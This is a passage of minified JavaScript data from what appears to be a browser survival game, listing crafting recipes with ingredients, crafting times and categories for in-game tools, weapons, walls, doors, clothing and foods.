      r: [[le.SHOVEL_DIAMOND, 1], [le.GOLD, 60], [le.AMETHYST, 30], [le.DIAMOND, 40]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SHOVEL_AMETHYST,
      id2: le.SHOVEL_AMETHYST,
      time: 1 / 40,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WATERING_CAN,
      id2: le.WATERING_CAN,
      time: 0.2,
      t: Oe.TOOLS
    }, {
      r: [[le.WATERING_CAN, 1]],
      w: 0,
      f: 0,
      o: 1,
      e: 0,
      id: ue.WATERING_CAN_FULL,
      id2: le.WATERING_CAN_FULL,
      time: 0.2,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 100], [le.STONE, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PITCHFORK,
      id2: le.PITCHFORK,
      time: 0.1,
      t: Oe.TOOLS
    }, {
      r: [[le.PITCHFORK, 1], [le.PITCHFORK_PART, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PITCHFORK2,
      id2: le.PITCHFORK2,
      time: 1 / 60,
      t: Oe.TOOLS
    }, {
      r: [[le.PAPER, 4], [le.CORD, 4], [le.FUR_WOLF, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BOOK,
      id2: le.BOOK,
      time: 1 / 15,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 40]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_SPEAR,
      id2: le.WOOD_SPEAR,
      time: 0.2,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD_SPEAR, 1], [le.WOOD, 60], [le.STONE, 10]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SPEAR,
      id2: le.SPEAR,
      time: 0.1,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 80], [le.GOLD, 30], [le.STONE, 30], [le.SPEAR, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_SPEAR,
      id2: le.GOLD_SPEAR,
      t: Oe.WEAPONS,
      time: 0.05
    }, {
      r: [[le.WOOD, 200], [le.DIAMOND, 40], [le.GOLD, 60], [le.GOLD_SPEAR, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_SPEAR,
      id2: le.DIAMOND_SPEAR,
      time: 1 / 30,
      t: Oe.WEAPONS
    }, {
      r: [[le.AMETHYST, 40], [le.DIAMOND, 80], [le.GOLD, 90], [le.DIAMOND_SPEAR, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_SPEAR,
      id2: le.AMETHYST_SPEAR,
      time: 1 / 60,
      t: Oe.WEAPONS
    }, {
      r: [[le.REIDITE, 40], [le.AMETHYST, 80], [le.DIAMOND, 90], [le.AMETHYST_SPEAR, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_SPEAR,
      id2: le.REIDITE_SPEAR,
      time: 1 / 90,
      t: Oe.WEAPONS
    }, {
      r: [[le.BLUE_CORD, 20], [le.DRAGON_ORB, 1], [le.AMETHYST, 100], [le.DRAGON_HEART, 3]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.DRAGON_SPEAR,
      id2: le.DRAGON_SPEAR,
      time: 1 / 120,
      t: Oe.WEAPONS
    }, {
      r: [[le.DRAGON_SPEAR, 1], [le.LAVA_ORB, 1], [le.REIDITE, 100], [le.LAVA_HEART, 2]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.LAVA_SPEAR,
      id2: le.LAVA_SPEAR,
      time: 0.005,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD_SPEAR, 1], [le.CRAB_LOOT, 5], [le.CORD, 6]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.CRAB_SPEAR,
      id2: le.CRAB_SPEAR,
      time: 1 / 30,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 30]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SWORD_WOOD,
      id2: le.SWORD_WOOD,
      time: 0.2,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 50], [le.STONE, 25], [le.SWORD_WOOD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SWORD,
      id2: le.SWORD,
      time: 0.1,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 60], [le.GOLD, 40], [le.STONE, 50], [le.SWORD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SWORD_GOLD,
      id2: le.SWORD_GOLD,
      time: 0.05,
      t: Oe.WEAPONS
    }, {
      r: [[le.DIAMOND, 40], [le.GOLD, 60], [le.STONE, 80], [le.SWORD_GOLD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SWORD_DIAMOND,
      id2: le.SWORD_DIAMOND,
      time: 1 / 30,
      t: Oe.WEAPONS
    }, {
      r: [[le.DIAMOND, 60], [le.GOLD, 100], [le.AMETHYST, 40], [le.SWORD_DIAMOND, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SWORD_AMETHYST,
      id2: le.SWORD_AMETHYST,
      time: 1 / 60,
      t: Oe.WEAPONS
    }, {
      r: [[le.DIAMOND, 100], [le.AMETHYST, 80], [le.REIDITE, 40], [le.SWORD_AMETHYST, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_SWORD,
      id2: le.REIDITE_SWORD,
      time: 1 / 90,
      t: Oe.WEAPONS
    }, {
      r: [[le.PLANT, 3]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.SEED,
      id2: le.SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.WILD_WHEAT, 3]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.WHEAT_SEED,
      id2: le.WHEAT_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.PUMPKIN, 8]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.PUMPKIN_SEED,
      id2: le.PUMPKIN_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.GARLIC, 8]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.GARLIC_SEED,
      id2: le.GARLIC_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.THORNBUSH, 8]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.THORNBUSH_SEED,
      id2: le.THORNBUSH_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.CARROT, 8]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.CARROT_SEED,
      id2: le.CARROT_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.TOMATO, 8]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.TOMATO_SEED,
      id2: le.TOMATO_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.WATERMELON, 16]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.WATERMELON_SEED,
      id2: le.WATERMELON_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.ALOE_VERA, 16]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.ALOE_VERA_SEED,
      id2: le.ALOE_VERA_SEED,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.MEAT, 1]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.COOKED_MEAT,
      id2: le.COOKED_MEAT,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.FOODFISH, 1]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.FOODFISH_COOKED,
      id2: le.FOODFISH_COOKED,
      time: 1 / 3,
      t: Oe.FOODS
    }, {
      r: [[le.FLOUR, 3]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.BREAD,
      id2: le.BREAD,
      time: 1 / 3,
      t: Oe.FOODS
    }, {
      r: [[le.FLOUR, 3], [le.PLANT, 1]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.COOKIE,
      id2: le.COOKIE,
      time: 1 / 3,
      t: Oe.FOODS
    }, {
      r: [[le.FLOUR, 5], [le.PLANT, 2], [le.ICE, 2]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.CAKE,
      id2: le.CAKE,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.CORD, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BANDAGE,
      id2: le.BANDAGE,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 20]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WALL,
      id2: le.WALL,
      time: 0.2,
      t: Oe.BASES
    }, {
      r: [[le.WALL, 1], [le.STONE, 17]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_WALL,
      id2: le.STONE_WALL,
      time: 0.2,
      t: Oe.BASES
    }, {
      r: [[le.STONE_WALL, 1], [le.GOLD, 14]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_WALL,
      id2: le.GOLD_WALL,
      time: 0.2,
      t: Oe.BASES
    }, {
      r: [[le.GOLD_WALL, 1], [le.DIAMOND, 11]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_WALL,
      id2: le.DIAMOND_WALL,
      time: 0.2,
      t: Oe.BASES
    }, {
      r: [[le.DIAMOND_WALL, 1], [le.AMETHYST, 8]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_WALL,
      id2: le.AMETHYST_WALL,
      time: 0.2,
      t: Oe.BASES
    }, {
      r: [[le.AMETHYST_WALL, 1], [le.REIDITE, 5]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_WALL,
      id2: le.REIDITE_WALL,
      time: 0.2,
      t: Oe.BASES
    }, {
      r: [[le.WOOD, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_DOOR,
      id2: le.WOOD_DOOR,
      time: 1 / 8,
      t: Oe.BASES
    }, {
      r: [[le.WOOD_DOOR, 1], [le.STONE, 27]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_DOOR,
      id2: le.STONE_DOOR,
      time: 1 / 8,
      t: Oe.BASES
    }, {
      r: [[le.STONE_DOOR, 1], [le.GOLD, 24]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_DOOR,
      id2: le.GOLD_DOOR,
      time: 1 / 8,
      t: Oe.BASES
    }, {
      r: [[le.GOLD_DOOR, 1], [le.DIAMOND, 21]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_DOOR,
      id2: le.DIAMOND_DOOR,
      time: 1 / 8,
      t: Oe.BASES
    }, {
      r: [[le.DIAMOND_DOOR, 1], [le.AMETHYST, 18]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_DOOR,
      id2: le.AMETHYST_DOOR,
      time: 1 / 8,
      t: Oe.BASES
    }, {
      r: [[le.AMETHYST_DOOR, 1], [le.REIDITE, 15]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_DOOR,
      id2: le.REIDITE_DOOR,
      time: 1 / 8,
      t: Oe.BASES
    }, {
      r: [[le.WALL, 1], [le.WOOD, 40], [le.STONE, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SPIKE,
      id2: le.SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.STONE_WALL, 1], [le.STONE, 70]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_SPIKE,
      id2: le.STONE_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.GOLD_WALL, 1], [le.GOLD, 40], [le.STONE, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_SPIKE,
      id2: le.GOLD_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.DIAMOND_WALL, 1], [le.DIAMOND, 40], [le.STONE, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_SPIKE,
      id2: le.DIAMOND_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.AMETHYST_WALL, 1], [le.AMETHYST, 40], [le.STONE, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_SPIKE,
      id2: le.AMETHYST_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.REIDITE_WALL, 1], [le.REIDITE, 40], [le.GOLD, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_SPIKE,
      id2: le.REIDITE_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.WOOD_DOOR, 1], [le.WOOD, 80], [le.STONE, 60]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_DOOR_SPIKE,
      id2: le.WOOD_DOOR_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.STONE_DOOR, 1], [le.STONE, 140]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_DOOR_SPIKE,
      id2: le.STONE_DOOR_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.GOLD_DOOR, 1], [le.GOLD, 80], [le.STONE, 60]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_DOOR_SPIKE,
      id2: le.GOLD_DOOR_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.DIAMOND_DOOR, 1], [le.DIAMOND, 80], [le.STONE, 60]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_DOOR_SPIKE,
      id2: le.DIAMOND_DOOR_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.AMETHYST_DOOR, 1], [le.AMETHYST, 80], [le.STONE, 60]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_DOOR_SPIKE,
      id2: le.AMETHYST_DOOR_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.REIDITE_DOOR, 1], [le.REIDITE, 80], [le.GOLD, 60]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_DOOR_SPIKE,
      id2: le.REIDITE_DOOR_SPIKE,
      time: 0.05,
      t: Oe.BASES
    }, {
      r: [[le.WOOD, 25], [le.GOLD, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.CHEST,
      id2: le.CHEST,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.PAPER, 1], [le.FUR, 1], [le.CORD, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EXPLORER_HAT,
      id2: le.EXPLORER_HAT,
      time: 0.2,
      t: Oe.CLOTHES
    }, {
      r: [[le.PAPER, 5], [le.PENGUIN_FEATHER, 20], [le.BLUE_CORD, 5], [le.FUR, 5]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PIRATE_HAT,
      id2: le.PIRATE_HAT,
      time: 1 / 30,
      t: Oe.CLOTHES
    }, {
      r: [[le.PILOT_GLASSES, 1], [le.HAWK_FEATHER, 8], [le.VULTURE_FEATHER, 8], [le.PENGUIN_FEATHER, 8], [le.CORD, 6]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PILOT_HELMET,
      id2: le.PILOT_HELMET,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.FUR, 1], [le.CORD, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EARMUFFS,
      id2: le.EARMUFFS,
      time: 0.2,
      t: Oe.CLOTHES
    }, {
      r: [[le.EARMUFFS, 1], [le.FUR_WOLF, 5], [le.CORD, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.COAT,
      id2: le.COAT,
      time: 1 / 12,
      t: Oe.CLOTHES
    }, {
      r: [[le.COAT, 1], [le.FUR_WINTER, 5], [le.BLUE_CORD, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.CAP_SCARF,
      id2: le.CAP_SCARF,
      time: 1 / 30,
      t: Oe.CLOTHES
    }, {
      r: [[le.CAP_SCARF, 1], [le.FUR_WINTER, 5], [le.FUR_MAMMOTH, 10], [le.BLUE_CORD, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.FUR_HAT,
      id2: le.FUR_HAT,
      time: 0.02,
      t: Oe.CLOTHES
    }, {
      r: [[le.WOOD, 50]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_HELMET,
      id2: le.WOOD_HELMET,
      time: 0.2,
      t: Oe.CLOTHES
    }, {
      r: [[le.STONE, 75], [le.WOOD, 75], [le.WOOD_HELMET, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_HELMET,
      id2: le.STONE_HELMET,
      time: 0.1,
      t: Oe.CLOTHES
    }, {
      r: [[le.STONE, 90], [le.WOOD, 90], [le.GOLD, 90], [le.STONE_HELMET, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_HELMET,
      id2: le.GOLD_HELMET,
      time: 0.05,
      t: Oe.CLOTHES
    }, {
      r: [[le.STONE, 100], [le.GOLD, 100], [le.DIAMOND, 100], [le.GOLD_HELMET, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_HELMET,
      id2: le.DIAMOND_HELMET,
      time: 1 / 30,
      t: Oe.CLOTHES
    }, {
      r: [[le.AMETHYST, 80], [le.GOLD, 150], [le.DIAMOND, 120], [le.DIAMOND_HELMET, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_HELMET,
      id2: le.AMETHYST_HELMET,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.REIDITE, 80], [le.DIAMOND, 150], [le.AMETHYST, 120], [le.AMETHYST_HELMET, 1]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.REIDITE_HELMET,
      id2: le.REIDITE_HELMET,
      time: 1 / 90,
      t: Oe.CLOTHES
    }, {
      r: [[le.SCALES, 2], [le.DIAMOND, 40], [le.CORD, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIVING_MASK,
      id2: le.DIVING_MASK,
      time: 0.05,
      t: Oe.CLOTHES
    }, {
      r: [[le.DIVING_MASK, 1], [le.GOLD, 80], [le.KRAKEN_SKIN, 1], [le.AMETHYST, 20]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SUPER_DIVING_SUIT,
      id2: le.SUPER_DIVING_SUIT,
      time: 1 / 90,
      t: Oe.CLOTHES
    }, {
      r: [[le.FLAME, 5], [le.DIAMOND, 50], [le.BLUE_CORD, 5]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.DIAMOND_PROTECTION,
      id2: le.DIAMOND_PROTECTION,
      time: 0.05,
      t: Oe.CLOTHES
    }, {
      r: [[le.DIAMOND_PROTECTION, 1], [le.FLAME, 10], [le.AMETHYST, 50]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.AMETHYST_PROTECTION,
      id2: le.AMETHYST_PROTECTION,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.AMETHYST_PROTECTION, 1], [le.FLAME, 15], [le.AMETHYST, 50], [le.REIDITE, 50]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.REIDITE_PROTECTION,
      id2: le.REIDITE_PROTECTION,
      time: 1 / 90,
      t: Oe.CLOTHES
    }, {
      r: [[le.CORD, 4], [le.FUR_BOAR, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.TURBAN1,
      id2: le.TURBAN1,
      time: 1 / 15,
      t: Oe.CLOTHES
    }, {
      r: [[le.TURBAN1, 1], [le.CORD, 6], [le.FUR_BOAR, 4], [le.VULTURE_FEATHER, 12], [le.PENGUIN_FEATHER, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.TURBAN2,
      id2: le.TURBAN2,
      time: 1 / 150,
      t: Oe.CLOTHES
    }, {
      r: [[le.CORD, 6], [le.FUR_WOLF, 5]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BAG,
      id2: le.BAG,
      time: 1 / 15,
      t: Oe.CLOTHES
    }, {
      r: [[le.WOOD, 20]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.PAPER,
      id2: le.PAPER,
      time: 1 / 3,
      t: Oe.UTILS
    }, {
      r: [[le.DIAMOND, 1], [le.CORD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BLUE_CORD,
      id2: le.BLUE_CORD,
      time: 1 / 3,
      t: Oe.UTILS
    }, {
      r: [[le.GOLD, 10]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.LOCK,
      id2: le.LOCK,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.GOLD, 250]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.LOCKPICK,
      id2: le.LOCKPICK,
      time: 1 / 60,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.TOTEM,
      id2: le.TOTEM,
      time: 0.1,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 15]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BRIDGE,
      id2: le.BRIDGE,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.ROOF,
      id2: le.ROOF,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 120]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_TOWER,
      id2: le.WOOD_TOWER,
      time: 1 / 15,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 20], [le.GROUND, 15]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PLOT,
      id2: le.PLOT,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.SAND, 25]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.BOTTLE_EMPTY,
      id2: le.BOTTLE_EMPTY,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.BOTTLE_EMPTY, 1]],
      w: 0,
      f: 0,
      o: 1,
      e: 0,
      id: ue.BOTTLE_FULL,
      id2: le.BOTTLE_FULL,
      time: 0.2,
      t: Oe.FOODS
    }, {
      r: [[le.ICE, 20], [le.BOTTLE_EMPTY, 1]],
      w: 0,
      f: 1,
      o: 0,
      e: 0,
      id: ue.BOTTLE_FULL_2,
      id2: le.BOTTLE_FULL,
      time: 0.1,
      t: Oe.FOODS
    }, {
      r: [[le.BOTTLE_EMPTY, 1]],
      w: 0,
      f: 0,
      o: 0,
      e: 1,
      id: ue.BOTTLE_FULL_3,
      id2: le.BOTTLE_FULL,
      time: 1 / 3,
      t: Oe.FOODS
    }, {
      r: [[le.WOOD, 60], [le.STONE, 20], [le.CORD, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WINDMILL,
      id2: le.WINDMILL,
      time: 0.1,
      t: Oe.UTILS
    }, {
      r: [[le.DIAMOND, 40], [le.STONE, 45]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.RESURRECTION,
      id2: le.RESURRECTION,
      time: 0.05,
      t: Oe.UTILS
    }, {
      r: [[le.RESURRECTION, 1], [le.EMERALD, 40], [le.SANDWORM_JUICE, 1]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.EMERALD_MACHINE,
      id2: le.EMERALD_MACHINE,
      time: 0.005,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 50], [le.STONE, 100]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EXTRACTOR_MACHINE_STONE,
      id2: le.EXTRACTOR_MACHINE_STONE,
      time: 1 / 90,
      t: Oe.UTILS
    }, {
      r: [[le.STONE, 60], [le.GOLD, 120]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EXTRACTOR_MACHINE_GOLD,
      id2: le.EXTRACTOR_MACHINE_GOLD,
      time: 1 / 90,
      t: Oe.UTILS
    }, {
      r: [[le.GOLD, 70], [le.DIAMOND, 140]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EXTRACTOR_MACHINE_DIAMOND,
      id2: le.EXTRACTOR_MACHINE_DIAMOND,
      time: 1 / 90,
      t: Oe.UTILS
    }, {
      r: [[le.DIAMOND, 80], [le.AMETHYST, 160]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EXTRACTOR_MACHINE_AMETHYST,
      id2: le.EXTRACTOR_MACHINE_AMETHYST,
      time: 1 / 90,
      t: Oe.UTILS
    }, {
      r: [[le.AMETHYST, 90], [le.REIDITE, 180]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.EXTRACTOR_MACHINE_REIDITE,
      id2: le.EXTRACTOR_MACHINE_REIDITE,
      time: 1 / 90,
      t: Oe.UTILS
    }, {
      r: [[le.STONE, 70]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SPANNER,
      id2: le.SPANNER,
      time: 0.1,
      t: Oe.TOOLS
    }, {
      r: [[le.STONE, 70], [le.WOOD, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.MACHETE,
      id2: le.MACHETE,
      time: 0.1,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 40], [le.STONE, 40]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BREAD_OVEN,
      id2: le.BREAD_OVEN,
      time: 0.1,
      t: Oe.UTILS
    }, {
      r: [[le.BREAD, 1], [le.COOKED_MEAT, 1]],
      w: 0,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SANDWICH,
      id2: le.SANDWICH,
      time: 1 / 3,
      t: Oe.FOODS
    }, {
      r: [[le.BLUE_CORD, 30], [le.DRAGON_CUBE, 1], [le.AMETHYST, 150], [le.DRAGON_HEART, 3]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.DRAGON_HELMET,
      id2: le.DRAGON_HELMET,
      time: 1 / 120,
      t: Oe.CLOTHES
    }, {
      r: [[le.DRAGON_HELMET, 1], [le.LAVA_CUBE, 1], [le.REIDITE, 150], [le.LAVA_HEART, 2]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.LAVA_HELMET,
      id2: le.LAVA_HELMET,
      time: 1 / 180,
      t: Oe.CLOTHES
    }, {
      r: [[le.GOLD_HELMET, 1], [le.CRAB_LOOT, 10], [le.CRAB_STICK, 10], [le.CORD, 10]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.CROWN_CRAB,
      id2: le.CROWN_CRAB,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.BLUE_CORD, 20], [le.DRAGON_ORB, 1], [le.AMETHYST, 150], [le.DRAGON_HEART, 3]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.DRAGON_SWORD,
      id2: le.DRAGON_SWORD,
      time: 1 / 120,
      t: Oe.WEAPONS
    }, {
      r: [[le.DRAGON_SWORD, 1], [le.LAVA_ORB, 1], [le.REIDITE, 150], [le.LAVA_HEART, 2]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.LAVA_SWORD,
      id2: le.LAVA_SWORD,
      time: 1 / 180,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 100], [le.CORD, 4]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_BOW,
      id2: le.WOOD_BOW,
      time: 0.05,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 30]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_ARROW,
      id2: le.WOOD_ARROW,
      time: 0.2,
      t: Oe.WEAPONS
    }, {
      r: [[le.STONE, 200], [le.CORD, 8], [le.PENGUIN_FEATHER, 4], [le.WOOD_BOW, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_BOW,
      id2: le.STONE_BOW,
      time: 0.04,
      t: Oe.WEAPONS
    }, {
      r: [[le.STONE, 20], [le.HAWK_FEATHER, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_ARROW,
      id2: le.STONE_ARROW,
      time: 0.2,
      t: Oe.WEAPONS
    }, {
      r: [[le.GOLD, 200], [le.CORD, 12], [le.HAWK_FEATHER, 4], [le.PENGUIN_FEATHER, 4], [le.STONE_BOW, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_BOW,
      id2: le.GOLD_BOW,
      time: 1 / 30,
      t: Oe.WEAPONS
    }, {
